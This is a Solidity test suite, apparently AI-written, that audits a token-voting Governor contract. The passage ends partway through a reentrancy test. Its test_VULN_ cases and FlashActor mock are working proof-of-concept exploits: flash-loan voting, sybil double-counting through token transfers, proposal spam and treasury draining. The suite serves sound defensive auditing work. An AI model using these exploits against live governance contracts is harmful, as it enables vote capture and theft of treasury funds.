// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

/// @notice This test contract is written by AI.

import {Test, stdError} from "forge-std/Test.sol";
import {Governor} from "../../src/Governor.sol";

/*//////////////////////////////////////////////////////////////
                            MOCKS
//////////////////////////////////////////////////////////////*/

interface IFlashBorrower {
    function onFlash(uint256 amount, bytes calldata data) external;
}

/// @dev Minimal ERC20 with a flash-mint so we can model flash-loan voting.
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
        emit Transfer(address(0), to, amt);
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        emit Transfer(from, to, amt);
        return true;
    }

    /// @dev Mint -> callback -> burn. Borrower must hold `amount` at the end.
    function flashMint(address receiver, uint256 amount, bytes calldata data) external {
        balanceOf[receiver] += amount;
        totalSupply += amount;
        IFlashBorrower(receiver).onFlash(amount, data);
        balanceOf[receiver] -= amount;
        totalSupply -= amount;
    }
}

/// @dev Zero-balance contract that borrows tokens, calls the governor, and repays in one tx.
contract FlashActor is IFlashBorrower {
    MockToken internal immutable TOKEN;
    address internal immutable GOV;

    constructor(MockToken t, address g) {
        TOKEN = t;
        GOV = g;
    }

    function attack(uint256 amount, bytes calldata govCall) external {
        TOKEN.flashMint(address(this), amount, govCall);
    }

    function onFlash(uint256, bytes calldata data) external {
        require(msg.sender == address(TOKEN), "not token");
        (bool ok, bytes memory ret) = GOV.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}

/// @dev A governance token with hostile behaviour, to probe how Governor handles a bad TOKEN.
///      `balanceOf` is intentionally NOT `view` (Governor still calls it via STATICCALL because
///      its IERC20 interface declares it view).
contract HostileToken {
    enum Mode {
        Normal,
        ReenterExecute,
        Reverting,
        MaxBalance
    }

    Mode public mode;
    Governor public gov;
    uint256 public targetId;
    mapping(address => uint256) public bal;

    function mint(address to, uint256 a) external {
        bal[to] += a;
    }

    function configure(Mode m, Governor g, uint256 id) external {
        mode = m;
        gov = g;
        targetId = id;
    }

    function balanceOf(address a) external returns (uint256) {
        if (mode == Mode.Reverting) revert("hostile");
        if (mode == Mode.MaxBalance) return type(uint256).max;
        if (mode == Mode.ReenterExecute) {
            // If this reentrant state change were possible, we would revert with a marker
            // and the surrounding Governor call would fail loudly.
            try gov.execute{gas: 200_000}(targetId) {
                revert("REENTERED");
            } catch {}
        }
        return bal[a];
    }
}

/*---------------------------- proposal targets ----------------------------*/

contract Counter {
    uint256 public n;

    function inc() external {
        n++;
    }

    function boom() external pure {
        revert("nope");
    }
}

contract Recorder {
    address public lastSender;
    uint256 public calls;

    function record() external {
        lastSender = msg.sender;
        calls++;
    }
}

contract Toggle {
    bool public ok;
    uint256 public n;

    function enable() external {
        ok = true;
    }

    function run() external {
        require(ok, "not ready");
        n++;
    }
}

contract Vault {
    address public immutable GOVERNOR;
    uint256 public fee;

    error NotGovernor();

    constructor(address g) {
        GOVERNOR = g;
    }

    function setFee(uint256 f) external {
        if (msg.sender != GOVERNOR) revert NotGovernor();
        fee = f;
    }
}

/// @dev Proposal target that tries to call back into the Governor while `execute` is running.
contract ReentrantTarget {
    enum Mode {
        ExecuteSwallow,
        ExecutePropagate,
        Vote,
        Propose,
        ExecuteOther,
        ObserveState
    }

    Governor public gov;
    Mode public mode;
    uint256 public id;
    uint256 public otherId;
    uint256 public pokes;
    bool public reentrySucceeded;
    Governor.ProposalState public observed;

    function configure(Governor g, Mode m, uint256 id_, uint256 other_) external {
        gov = g;
        mode = m;
        id = id_;
        otherId = other_;
    }

    function poke() external {
        pokes++;
        if (mode == Mode.ExecuteSwallow) {
            try gov.execute(id) {
                reentrySucceeded = true;
            } catch {}
        } else if (mode == Mode.ExecutePropagate) {
            gov.execute(id);
        } else if (mode == Mode.Vote) {
            try gov.vote(id, true) {
                reentrySucceeded = true;
            } catch {}
        } else if (mode == Mode.Propose) {
            try gov.propose(address(this), "", "re") {
                reentrySucceeded = true;
            } catch {}
        } else if (mode == Mode.ExecuteOther) {
            gov.execute(otherId);
            reentrySucceeded = true;
        } else {
            observed = gov.state(id);
        }
    }
}

/*//////////////////////////////////////////////////////////////
                         MAIN TEST SUITE
//////////////////////////////////////////////////////////////*/

/// @notice Tests prefixed `test_VULN_` PASS while the vulnerability exists: they document and
///         prove the issue. After you fix it (e.g. snapshot voting power), invert the asserts.
contract GovernorSecurityTest is Test {
    Governor internal gov;
    MockToken internal token;
    Counter internal counter;

    address internal alice = makeAddr("alice"); // 60e18
    address internal bob = makeAddr("bob"); // 50e18
    address internal carol = makeAddr("carol"); // 40e18
    address internal stranger = makeAddr("stranger"); // 0

    uint256 internal constant QUORUM = 100e18;

    event ProposalCreated(address indexed target, bytes callData, string description);

    function setUp() public {
        vm.warp(1_000_000);
        token = new MockToken();
        gov = new Governor(address(token));
        counter = new Counter();
        token.mint(alice, 60e18);
        token.mint(bob, 50e18);
        token.mint(carol, 40e18);
    }

    /*------------------------------ helpers ------------------------------*/

    function _incData() internal pure returns (bytes memory) {
        return abi.encodeCall(Counter.inc, ());
    }

    function _propose(address who, address target, bytes memory data) internal returns (uint256) {
        vm.prank(who);
        gov.propose(target, data, "test");
        return gov.currentID() - 1;
    }

    function _vote(address who, uint256 id, bool support) internal {
        vm.prank(who);
        gov.vote(id, support);
    }

    function _fund(string memory name, uint256 amt) internal returns (address a) {
        a = makeAddr(name);
        token.mint(a, amt);
    }

    /// alice (60) + bob (50) = 110 >= quorum, all in favour
    function _voteYes(uint256 id) internal {
        _vote(alice, id, true);
        _vote(bob, id, true);
    }

    function _warpExecutable(uint256 id) internal {
        vm.warp(_end(id) + gov.TIMELOCK_DELAY());
    }

    function _assertState(uint256 id, Governor.ProposalState s) internal {
        assertEq(uint8(gov.state(id)), uint8(s));
    }

    // proposals() getter field readers (10 fields)
    function _id(uint256 p) internal view returns (uint256 x) {
        (x,,,,,,,,,) = gov.proposals(p);
    }

    function _proposer(uint256 p) internal view returns (address x) {
        (, x,,,,,,,,) = gov.proposals(p);
    }

    function _target(uint256 p) internal view returns (address x) {
        (,, x,,,,,,,) = gov.proposals(p);
    }

    function _callData(uint256 p) internal view returns (bytes memory x) {
        (,,, x,,,,,,) = gov.proposals(p);
    }

    function _desc(uint256 p) internal view returns (string memory x) {
        (,,,, x,,,,,) = gov.proposals(p);
    }

    function _votesFor(uint256 p) internal view returns (uint256 x) {
        (,,,,, x,,,,) = gov.proposals(p);
    }

    function _votesAgainst(uint256 p) internal view returns (uint256 x) {
        (,,,,,, x,,,) = gov.proposals(p);
    }

    function _start(uint256 p) internal view returns (uint256 x) {
        (,,,,,,, x,,) = gov.proposals(p);
    }

    function _end(uint256 p) internal view returns (uint256 x) {
        (,,,,,,,, x,) = gov.proposals(p);
    }

    function _executed(uint256 p) internal view returns (bool x) {
        (,,,,,,,,, x) = gov.proposals(p);
    }

    /*//////////////////////////////////////////////////////////////
                              DEPLOYMENT
    //////////////////////////////////////////////////////////////*/

    function test_constructor_setsToken() public {
        assertEq(gov.TOKEN(), address(token));
        assertEq(gov.currentID(), 1);
    }

    function test_constructor_constants() public {
        assertEq(gov.VOTING_PERIOD(), 3 days);
        assertEq(gov.TIMELOCK_DELAY(), 2 days);
        assertEq(gov.QUORUM(), 100e18);
        assertEq(gov.MAX_DESCRIPTION_LENGTH(), 512);
    }

    function test_constructor_zeroAddressTokenBricksProposeAndVote() public {
        Governor g = new Governor(address(0));
        vm.expectRevert();
        vm.prank(alice);
        g.propose(address(counter), "", "x");
        vm.expectRevert();
        vm.prank(alice);
        g.vote(1, true);
        // views that never touch the token still work
        assertEq(uint8(g.state(1)), uint8(Governor.ProposalState.Defeated));
    }

    function test_constructor_eoaTokenBricksProposeAndVote() public {
        Governor g = new Governor(makeAddr("notAToken"));
        vm.expectRevert();
        vm.prank(alice);
        g.propose(address(counter), "", "x");
    }

    /*//////////////////////////////////////////////////////////////
                                PROPOSE
    //////////////////////////////////////////////////////////////*/

    function test_propose_storesAllFieldsAndEmits() public {
        bytes memory data = _incData();
        vm.expectEmit(true, false, false, true, address(gov));
        emit ProposalCreated(address(counter), data, "test");
        uint256 id = _propose(alice, address(counter), data);

        assertEq(id, 1);
        assertEq(gov.currentID(), 2);
        assertEq(_id(id), 1);
        assertEq(_proposer(id), alice);
        assertEq(_target(id), address(counter));
        assertEq(_callData(id), data);
        assertEq(_desc(id), "test");
        assertEq(_votesFor(id), 0);
        assertEq(_votesAgainst(id), 0);
        assertEq(_start(id), block.timestamp);
        assertEq(_end(id), block.timestamp + gov.VOTING_PERIOD());
        assertFalse(_executed(id));
        _assertState(id, Governor.ProposalState.Active);
    }

    function test_propose_idsIncrementSequentially() public {
        for (uint256 i = 1; i <= 5; i++) {
            assertEq(_propose(alice, address(counter), _incData()), i);
        }
        assertEq(gov.currentID(), 6);
    }

    function test_propose_identicalProposalsGetDistinctIds() public {
        uint256 a = _propose(alice, address(counter), _incData());
        uint256 b = _propose(alice, address(counter), _incData());
        assertTrue(a != b);
    }

    function test_propose_revertsWithoutTokens() public {
        vm.expectRevert(bytes("You don't have enough power to propose"));
        vm.prank(stranger);
        gov.propose(address(counter), "", "x");
        assertEq(gov.currentID(), 1);
    }

    function test_propose_revertsZeroTarget() public {
        vm.expectRevert(bytes("zero address contract is not allowed"));
        vm.prank(alice);
        gov.propose(address(0), "", "x");
    }

    function test_propose_descriptionLengthBoundary() public {
        vm.prank(alice);
        gov.propose(address(counter), "", string(new bytes(512))); // exactly max: ok

        vm.expectRevert(bytes("too much wtf make it short"));
        vm.prank(alice);
        gov.propose(address(counter), "", string(new bytes(513)));
    }

    function test_propose_emptyDescriptionAndCalldataAllowed() public {
        vm.prank(alice);
        gov.propose(address(counter), "", "");
        assertEq(gov.currentID(), 2);
    }

    function test_propose_proposerBalanceOnlyCheckedAtCreation() public {
        uint256 id = _propose(alice, address(counter), _incData());
        vm.prank(alice);
        token.transfer(bob, 60e18);
        assertEq(token.balanceOf(alice), 0);
        _assertState(id, Governor.ProposalState.Active); // proposal unaffected
    }

    /// DoS/spam: a 1-wei holder can create unlimited proposals (no threshold, no cooldown).
    function test_VULN_dustHolderCanSpamProposals() public {
        address dust = _fund("dust", 1);
        for (uint256 i; i < 50; i++) {
            _propose(dust, address(counter), _incData());
        }
        assertEq(gov.currentID(), 51);
    }

    /// No cap on calldata size -> unbounded storage per proposal.
    function test_VULN_unboundedCallData() public {
        bytes memory big = new bytes(20_000);
        uint256 id = _propose(alice, address(counter), big);
        assertEq(_callData(id).length, 20_000);
    }

    /// Targets are not validated to be contracts.
    function test_VULN_eoaTargetAccepted() public {
        uint256 id = _propose(alice, makeAddr("eoa"), hex"deadbeef");
        assertEq(id, 1);
    }

    function testFuzz_propose_descriptionLength(uint16 len) public {
        uint256 l = bound(len, 0, 1500);
        string memory d = string(new bytes(l));
        vm.prank(alice);
        if (l > 512) {
            vm.expectRevert(bytes("too much wtf make it short"));
        }
        gov.propose(address(counter), "", d);
        assertEq(gov.currentID(), l > 512 ? 1 : 2);
    }

    function testFuzz_propose_arbitraryTargetAndData(address target, bytes memory data) public {
        vm.assume(target != address(0));
        uint256 id = _propose(alice, target, data);
        assertEq(_target(id), target);
        assertEq(_callData(id), data);
        assertEq(_proposer(id), alice);
    }

    /*//////////////////////////////////////////////////////////////
                                 VOTE
    //////////////////////////////////////////////////////////////*/

    function test_vote_forAndAgainstUseBalanceAsWeight() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, true);
        _vote(bob, id, false);
        assertEq(_votesFor(id), 60e18);
        assertEq(_votesAgainst(id), 50e18);
        assertTrue(gov.hasVoted(id, alice));
        assertTrue(gov.hasVoted(id, bob));
        assertFalse(gov.hasVoted(id, carol));
    }

    function test_vote_revertsWithoutTokens() public {
        uint256 id = _propose(alice, address(counter), _incData());
        vm.expectRevert(bytes("You don't have enough power to vote"));
        _vote(stranger, id, true);
    }

    function test_vote_revertsOnDoubleVote() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, true);
        vm.expectRevert(Governor.AlreadyVoted.selector);
        _vote(alice, id, false);
        assertEq(_votesFor(id), 60e18);
        assertEq(_votesAgainst(id), 0);
    }

    function test_vote_alreadyVotedCheckPrecedesStateCheck() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, true);
        vm.warp(_end(id) + 1);
        vm.expectRevert(Governor.AlreadyVoted.selector); // not VotingNotActive
        _vote(alice, id, true);
    }

    function test_vote_nonexistentProposalReverts() public {
        vm.expectRevert(Governor.VotingNotActive.selector);
        _vote(alice, 999, true);
        vm.expectRevert(Governor.VotingNotActive.selector);
        _vote(alice, 0, true);
    }

    function test_vote_windowBoundaries() public {
        uint256 id = _propose(alice, address(counter), _incData());
        uint256 end = _end(id);

        vm.warp(end - 1);
        _vote(alice, id, true); // last valid second

        vm.warp(end);
        vm.expectRevert(Governor.VotingNotActive.selector);
        _vote(bob, id, true); // closed at endTime exactly
    }

    function test_vote_sameBlockAsCreationAllowed() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, true);
        assertEq(_votesFor(id), 60e18);
    }

    function test_vote_pendingStateIsUnreachable() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _assertState(id, Governor.ProposalState.Active);
        assertTrue(gov.state(id) != Governor.ProposalState.Pending);
    }

    function test_vote_hasVotedIsPerProposal() public {
        uint256 a = _propose(alice, address(counter), _incData());
        uint256 b = _propose(alice, address(counter), _incData());
        _vote(alice, a, true);
        assertFalse(gov.hasVoted(b, alice));
        _vote(alice, b, false);
        assertEq(_votesFor(a), 60e18);
        assertEq(_votesAgainst(b), 60e18);
    }

    function test_vote_weightIsLiveBalanceNotSnapshot() public {
        uint256 id = _propose(alice, address(counter), _incData());
        address late = makeAddr("late"); // had 0 at creation
        token.mint(late, 10e18);
        _vote(late, id, true);
        assertEq(_votesFor(id), 10e18);
    }

    function test_vote_voterWithBalanceZeroAfterVotingStillCounted() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, true);
        vm.prank(alice);
        token.transfer(stranger, 60e18);
        assertEq(_votesFor(id), 60e18);
    }

    function testFuzz_vote_tallyMatchesBalances(uint96 x, uint96 y, bool sx, bool sy) public {
        uint256 bx = bound(x, 1, 1e30);
        uint256 by = bound(y, 1, 1e30);
        address vx = _fund("vx", bx);
        address vy = _fund("vy", by);
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(vx, id, sx);
        _vote(vy, id, sy);
        uint256 expFor = (sx ? bx : 0) + (sy ? by : 0);
        uint256 expAgainst = (sx ? 0 : bx) + (sy ? 0 : by);
        assertEq(_votesFor(id), expFor);
        assertEq(_votesAgainst(id), expAgainst);
    }

    function testFuzz_vote_cannotVoteTwice(bool first, bool second) public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, first);
        vm.expectRevert(Governor.AlreadyVoted.selector);
        _vote(alice, id, second);
        assertEq(_votesFor(id) + _votesAgainst(id), 60e18);
    }

    /*//////////////////////////////////////////////////////////////
                    VOTING-POWER / ACCOUNTING EXPLOITS
    //////////////////////////////////////////////////////////////*/

    /// Vote, transfer tokens to a fresh address, vote again: the same tokens count twice.
    function test_VULN_doubleCountViaTokenTransfer() public {
        uint256 id = _propose(alice, address(counter), _incData());
        address sock = makeAddr("sock");

        _vote(alice, id, true);
        vm.prank(alice);
        token.transfer(sock, 60e18);
        _vote(sock, id, true);

        assertEq(_votesFor(id), 120e18); // 2x real power
        assertGt(_votesFor(id), token.balanceOf(alice) + token.balanceOf(sock));
    }

    /// Chain the same tokens through n sock-puppets: tally = n * balance.
    function testFuzz_VULN_sybilMultiplier(uint8 n) public {
        uint256 k = bound(n, 2, 25);
        uint256 id = _propose(alice, address(counter), _incData());
        address current = alice;
        for (uint256 i; i < k; i++) {
            _vote(current, id, true);
            address next = address(uint160(uint256(keccak256(abi.encode("sock", i)))));
            vm.prank(current);
            token.transfer(next, 60e18);
            current = next;
        }
        assertEq(_votesFor(id), k * 60e18);
    }

    /// A zero-balance contract borrows tokens, votes, repays. Votes persist.
    function test_VULN_flashLoanVotePassesProposalAlone() public {
        uint256 id = _propose(alice, address(counter), _incData());
        FlashActor fa = new FlashActor(token, address(gov));

        fa.attack(1_000e18, abi.encodeCall(Governor.vote, (id, true)));

        assertEq(token.balanceOf(address(fa)), 0); // loan repaid
        assertEq(_votesFor(id), 1_000e18); // yet votes stand
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Queued);
        _warpExecutable(id);
        gov.execute(id);
        assertEq(counter.n(), 1);
    }

    function test_VULN_flashLoanCanPropose() public {
        FlashActor fa = new FlashActor(token, address(gov));
        fa.attack(1, abi.encodeCall(Governor.propose, (address(counter), _incData(), "flash")));
        assertEq(gov.currentID(), 2);
        assertEq(_proposer(1), address(fa));
        assertEq(token.balanceOf(address(fa)), 0);
    }

    /// Tokens bought in the last second decide the outcome.
    function test_VULN_lastSecondWhaleFlipsOutcome() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id); // 110e18 for
        vm.warp(_end(id) - 1);
        address whale = _fund("whale", 200e18); // acquired after proposal creation
        _vote(whale, id, false);
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Defeated);
    }

    /// Majority holder drains governor-held tokens (expected governance risk, documented).
    function test_VULN_majorityHolderDrainsTreasury() public {
        token.mint(address(gov), 500e18);
        address whale = _fund("whale", 1_000e18);
        uint256 id = _propose(whale, address(token), abi.encodeCall(MockToken.transfer, (whale, 500e18)));
        _vote(whale, id, true);
        _warpExecutable(id);
        gov.execute(id);
        assertEq(token.balanceOf(address(gov)), 0);
        assertEq(token.balanceOf(whale), 1_500e18);
    }

    /// Governor-held tokens can be made to vote via a self-call proposal.
    function test_VULN_treasuryTokensVoteViaSelfCall() public {
        token.mint(address(gov), 200e18);
        // Proposal A makes the governor vote on proposal #2 (B).
        uint256 a = _propose(alice, address(gov), abi.encodeCall(Governor.vote, (2, true)));
        _voteYes(a);
        vm.warp(_end(a));
        uint256 b = _propose(carol, address(counter), _incData());
        assertEq(b, 2);
        vm.warp(_end(a) + gov.TIMELOCK_DELAY()); // A executable, B still active
        _assertState(b, Governor.ProposalState.Active);

        gov.execute(a);

        assertEq(_votesFor(b), 200e18);
        assertTrue(gov.hasVoted(b, address(gov)));
    }

    /*//////////////////////////////////////////////////////////////
                             STATE MACHINE
    //////////////////////////////////////////////////////////////*/

    function test_state_nonexistentProposalsReadAsDefeated() public {
        _assertState(0, Governor.ProposalState.Defeated);
        _assertState(999, Governor.ProposalState.Defeated);
    }

    function test_state_activeThenDefeatedWithNoVotes() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _assertState(id, Governor.ProposalState.Active);
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Defeated);
    }

    function test_state_belowQuorumDefeated() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, true); // 60e18 < quorum
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Defeated);
    }

    function test_state_quorumExactlyMetPasses() public {
        address v1 = _fund("v1", 99e18);
        address v2 = _fund("v2", 1e18);
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(v1, id, true);
        _vote(v2, id, true);
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Queued);
    }

    function test_state_quorumOneWeiShortDefeated() public {
        address v1 = _fund("v1", QUORUM - 1);
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(v1, id, true);
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Defeated);
    }

    function test_state_tieIsDefeated() public {
        address opp = _fund("opp", 60e18);
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, true);
        _vote(opp, id, false);
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Defeated);
    }

    function test_state_againstMajorityDefeated() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, false);
        _vote(bob, id, true);
        vm.warp(_end(id));
        _assertState(id, Governor.ProposalState.Defeated);
    }

    function test_state_timelockBoundaries() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        uint256 end = _end(id);

        vm.warp(end - 1);
        _assertState(id, Governor.ProposalState.Active);
        vm.warp(end);
        _assertState(id, Governor.ProposalState.Queued);
        vm.warp(end + gov.TIMELOCK_DELAY() - 1);
        _assertState(id, Governor.ProposalState.Queued);
        vm.warp(end + gov.TIMELOCK_DELAY());
        _assertState(id, Governor.ProposalState.Succeeded);
        vm.warp(end + 365 days);
        _assertState(id, Governor.ProposalState.Succeeded); // no expiry
    }

    function test_state_executedTakesPrecedence() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        _assertState(id, Governor.ProposalState.Executed);
        vm.warp(block.timestamp + 365 days);
        _assertState(id, Governor.ProposalState.Executed);
    }

    function testFuzz_state_timeline(uint32 offset) public {
        uint256 id = _propose(alice, address(counter), _incData());
        uint256 start = _start(id);
        _voteYes(id);
        uint256 t = start + bound(offset, 0, 10 days);
        vm.warp(t);

        uint256 end = start + gov.VOTING_PERIOD();
        Governor.ProposalState expected = t < end
            ? Governor.ProposalState.Active
            : (t < end + gov.TIMELOCK_DELAY() ? Governor.ProposalState.Queued : Governor.ProposalState.Succeeded);
        _assertState(id, expected);
    }

    function testFuzz_state_quorumAndMajority(uint96 f, uint96 a) public {
        uint256 fv = bound(f, 1, 1e24);
        uint256 av = bound(a, 1, 1e24);
        address vf = _fund("vf", fv);
        address va = _fund("va", av);
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(vf, id, true);
        _vote(va, id, false);
        vm.warp(_end(id));

        Governor.ProposalState expected = (fv + av < QUORUM || fv <= av)
            ? Governor.ProposalState.Defeated
            : Governor.ProposalState.Queued;
        _assertState(id, expected);
    }

    /*//////////////////////////////////////////////////////////////
                                EXECUTE
    //////////////////////////////////////////////////////////////*/

    function test_execute_happyPath() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertEq(counter.n(), 1);
        assertTrue(_executed(id));
        _assertState(id, Governor.ProposalState.Executed);
    }

    function test_execute_revertsWhileActive() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        vm.expectRevert(Governor.ProposalNotSuccessful.selector);
        gov.execute(id);
    }

    function test_execute_timelockEnforcedToTheSecond() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        vm.warp(_end(id) + gov.TIMELOCK_DELAY() - 1);
        vm.expectRevert(Governor.ProposalNotSuccessful.selector);
        gov.execute(id);

        vm.warp(_end(id) + gov.TIMELOCK_DELAY());
        gov.execute(id);
        assertEq(counter.n(), 1);
    }

    function test_execute_defeatedAndNonexistentRevert() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _vote(alice, id, false);
        vm.warp(_end(id) + 30 days);
        vm.expectRevert(Governor.ProposalNotSuccessful.selector);
        gov.execute(id);
        vm.expectRevert(Governor.ProposalNotSuccessful.selector);
        gov.execute(0);
        vm.expectRevert(Governor.ProposalNotSuccessful.selector);
        gov.execute(12345);
    }

    function test_execute_cannotExecuteTwice() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        // NOTE: `require(!executed, "its already executed")` is dead code; state() reverts first.
        vm.expectRevert(Governor.ProposalNotSuccessful.selector);
        gov.execute(id);
        assertEq(counter.n(), 1);
    }

    function test_execute_isPermissionless() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        _warpExecutable(id);
        vm.prank(stranger); // no tokens, not proposer
        gov.execute(id);
        assertEq(counter.n(), 1);
    }

    function test_execute_msgSenderSeenByTargetIsGovernor() public {
        Recorder r = new Recorder();
        uint256 id = _propose(alice, address(r), abi.encodeCall(Recorder.record, ()));
        _voteYes(id);
        _warpExecutable(id);
        vm.prank(stranger);
        gov.execute(id);
        assertEq(r.lastSender(), address(gov));
        assertEq(r.calls(), 1);
    }

    function test_execute_failingCallRevertsAtomically() public {
        uint256 id = _propose(alice, address(counter), abi.encodeCall(Counter.boom, ()));
        _voteYes(id);
        _warpExecutable(id);
        vm.expectRevert(bytes("failed executing"));
        gov.execute(id);
        assertFalse(_executed(id));
        _assertState(id, Governor.ProposalState.Succeeded);
    }

    function test_execute_retryableAfterTargetBecomesReady() public {
        Toggle t = new Toggle();
        uint256 id = _propose(alice, address(t), abi.encodeCall(Toggle.run, ()));
        _voteYes(id);
        _warpExecutable(id);
        vm.expectRevert(bytes("failed executing"));
        gov.execute(id);

        t.enable();
        gov.execute(id);
        assertEq(t.n(), 1);
        _assertState(id, Governor.ProposalState.Executed);
    }

    /// A permanently failing proposal can never be executed or cancelled (no cancel exists).
    function test_VULN_permanentlyFailingProposalIsStuck() public {
        uint256 id = _propose(alice, address(counter), abi.encodeCall(Counter.boom, ()));
        _voteYes(id);
        _warpExecutable(id);
        for (uint256 i; i < 3; i++) {
            vm.expectRevert(bytes("failed executing"));
            gov.execute(id);
        }
        _assertState(id, Governor.ProposalState.Succeeded); // forever
    }

    /// Calling an EOA "succeeds": proposal is marked executed with no effect.
    function test_VULN_eoaTargetExecutesSilently() public {
        address eoa = makeAddr("eoa");
        uint256 id = _propose(alice, eoa, hex"12345678");
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        _assertState(id, Governor.ProposalState.Executed);
    }

    function test_execute_selfCallProposeFailsWithoutTreasuryTokens() public {
        uint256 id = _propose(alice, address(gov), abi.encodeCall(Governor.propose, (address(counter), "", "x")));
        _voteYes(id);
        _warpExecutable(id);
        vm.expectRevert(bytes("failed executing")); // msg.sender == governor, balance 0
        gov.execute(id);
    }

    function test_execute_proposalDataImmutableAcrossLifecycle() public {
        uint256 id = _propose(alice, address(counter), _incData());
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertEq(_proposer(id), alice);
        assertEq(_target(id), address(counter));
        assertEq(_callData(id), _incData());
        assertEq(_desc(id), "test");
        assertEq(_id(id), id);
    }

    function testFuzz_execute_respectsTimelock(uint32 offset) public {
        uint256 id = _propose(alice, address(counter), _incData());
        uint256 start = _start(id);
        _voteYes(id);
        uint256 t = start + bound(offset, 0, 10 days);
        vm.warp(t);
        if (t < start + gov.VOTING_PERIOD() + gov.TIMELOCK_DELAY()) {
            vm.expectRevert(Governor.ProposalNotSuccessful.selector);
            gov.execute(id);
            assertEq(counter.n(), 0);
        } else {
            gov.execute(id);
            assertEq(counter.n(), 1);
        }
    }

    /*//////////////////////////////////////////////////////////////
                              REENTRANCY
    //////////////////////////////////////////////////////////////*/

    function _reentrantSetup(ReentrantTarget.Mode mode, uint256 other)
        internal
        returns (ReentrantTarget t, uint256 id)
    {
        t = new ReentrantTarget();
        id = _propose(alice, address(t), abi.encodeCall(ReentrantTarget.poke, ()));
        t.configure(gov, mode, id, other);
    }

    function test_reentrancy_executeReentersExecute_swallowed() public {
        (ReentrantTarget t, uint256 id) = _reentrantSetup(ReentrantTarget.Mode.ExecuteSwallow, 0);
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertEq(t.pokes(), 1); // body ran exactly once
        assertFalse(t.reentrySucceeded());
        _assertState(id, Governor.ProposalState.Executed);
    }

    function test_reentrancy_executeReentersExecute_propagatedRevertsAll() public {
        (ReentrantTarget t, uint256 id) = _reentrantSetup(ReentrantTarget.Mode.ExecutePropagate, 0);
        _voteYes(id);
        _warpExecutable(id);
        vm.expectRevert(bytes("failed executing"));
        gov.execute(id);
        assertEq(t.pokes(), 0); // rolled back
        _assertState(id, Governor.ProposalState.Succeeded);
    }

    function test_reentrancy_voteDuringExecuteRejected() public {
        (ReentrantTarget t, uint256 id) = _reentrantSetup(ReentrantTarget.Mode.Vote, 0);
        token.mint(address(t), 10e18);
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertFalse(t.reentrySucceeded());
        assertEq(_votesFor(id), 110e18); // tally untouched
    }

    function test_reentrancy_proposeDuringExecuteIsBenign() public {
        (ReentrantTarget t, uint256 id) = _reentrantSetup(ReentrantTarget.Mode.Propose, 0);
        token.mint(address(t), 1e18);
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertTrue(t.reentrySucceeded());
        assertEq(gov.currentID(), 3);
        _assertState(id, Governor.ProposalState.Executed);
        _assertState(2, Governor.ProposalState.Active);
    }

    function test_reentrancy_nestedExecuteOfDifferentProposal() public {
        uint256 other = _propose(carol, address(counter), _incData()); // id 1
        (ReentrantTarget t, uint256 id) = _reentrantSetup(ReentrantTarget.Mode.ExecuteOther, other); // id 2
        _voteYes(other);
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertTrue(t.reentrySucceeded());
        assertEq(counter.n(), 1); // inner executed exactly once
        _assertState(other, Governor.ProposalState.Executed);
        _assertState(id, Governor.ProposalState.Executed);
    }

    /// CEI check: `executed` is already true when the external call happens.
    function test_reentrancy_stateIsExecutedDuringCallback() public {
